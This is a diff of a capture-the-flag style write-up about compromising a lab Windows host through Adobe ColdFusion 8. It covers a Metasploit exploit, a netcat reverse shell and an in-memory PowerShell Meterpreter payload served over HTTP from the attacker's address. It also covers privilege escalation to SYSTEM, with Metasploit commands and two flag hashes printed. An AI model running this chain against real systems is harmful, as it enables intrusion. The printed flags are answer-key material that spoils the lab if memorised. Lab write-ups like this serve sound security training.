@@ -43,30 +43,23 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 - Web Server (Adobe ColdFusion web server)
 
-![Pasted image 20250514155330.png](images/Pasted_image_20250514155330.png)
-
-![Pasted image 20250514155550.png](images/Pasted_image_20250514155550.png)
-
+![Pasted image 20250514155330.png](images/Pasted image 20250514155330.png)
+![Pasted image 20250514155550.png](images/Pasted image 20250514155550.png)
 - Adobe ColdFusion 8 Login Panel 
 
-![Pasted image 20250514155934.png](images/Pasted_image_20250514155934.png)
-
+![Pasted image 20250514155934.png](images/Pasted image 20250514155934.png)
 # Exploitation
 
 - Trying 1st Payload using Metasploit
 
-![Pasted image 20250514161334.png](images/Pasted_image_20250514161334.png)
-
-![Pasted image 20250514161446.png](images/Pasted_image_20250514161446.png)
-
-![Pasted image 20250514161504.png](images/Pasted_image_20250514161504.png)
-
+![Pasted image 20250514161334.png](images/Pasted image 20250514161334.png)
+![Pasted image 20250514161446.png](images/Pasted image 20250514161446.png)
+![Pasted image 20250514161504.png](images/Pasted image 20250514161504.png)
 - But Failed!!!!!!!!!!!
 
 - Started Debugging Using Burp with Proxy and found one problem: Metasploit only waits for 5 sec and then it gives error and shuts the listener, but this exploit takes 20 to 30 sec for getting shell. So we have to forward the POST request to proxy and take it into repeater, then shut the Metasploit listener off and start a netcat listener with the same port and send the request through repeater. Then we got the shell.  
 
-![Pasted image 20250514163820.png](images/Pasted_image_20250514163820.png)
-
+![Pasted image 20250514163820.png](images/Pasted image 20250514163820.png)
 - Now the problem is that I have a normal user/service shell which is kind of primitive in nature and we need a meterpreter shell. So for that, we use msfconsole to create another PowerShell payload which will be invoked from the shell we got.
 
 - After Creating that, we transport it to the victim machine using a Python HTTP server and invoke it directly in memory without leaving a file on disk. 
@@ -119,10 +112,8 @@ set lport 1337
 run
 ```
 
-![Pasted image 20250515100848.png](images/Pasted_image_20250515100848.png)
-
-![Pasted image 20250515101211.png](images/Pasted_image_20250515101211.png)
-
+![Pasted image 20250515100848.png](images/Pasted image 20250515100848.png)
+![Pasted image 20250515101211.png](images/Pasted image 20250515101211.png)
 - And we got our first flag!!
 
 ```lua
@@ -133,21 +124,18 @@ run
 
 - Now comes the post exploitation part, so for that we used Metasploit's default suggester which gives potential modules.
 
-![Pasted image 20250515101511.png](images/Pasted_image_20250515101511.png)
-
+![Pasted image 20250515101511.png](images/Pasted image 20250515101511.png)
 ```
 use post/multi/recon/local_exploit_suggester
 set SESSION 1
 run
 ```
 
-![Pasted image 20250515102031.png](images/Pasted_image_20250515102031.png)
-
+![Pasted image 20250515102031.png](images/Pasted image 20250515102031.png)
 - These are x86 version meterpreter exploits but we want x64 version, so we have to migrate to an x64 process to do this.
 - And for this, we have used the conhost.exe process.
 
-![Pasted image 20250515102505.png](images/Pasted_image_20250515102505.png)
-
+![Pasted image 20250515102505.png](images/Pasted image 20250515102505.png)
 - Now after doing the same exploit suggester, we found this to be vulnerable. So we used it and got the system shell. 👍
 
 ```
@@ -156,14 +144,11 @@ set SESSION 1
 set lhost 10.10.16.10
 ```
 
-![Pasted image 20250515103152.png](images/Pasted_image_20250515103152.png)
-
-![Pasted image 20250515103249.png](images/Pasted_image_20250515103249.png)
-
+![Pasted image 20250515103152.png](images/Pasted image 20250515103152.png)
+![Pasted image 20250515103249.png](images/Pasted image 20250515103249.png)
 - And finally got the root shell.
 
-![Pasted image 20250515103722.png](images/Pasted_image_20250515103722.png)
-
+![Pasted image 20250515103722.png](images/Pasted image 20250515103722.png)
 ```lua
 960b5b48915c3d781eb275a5f8965e6f
 ```
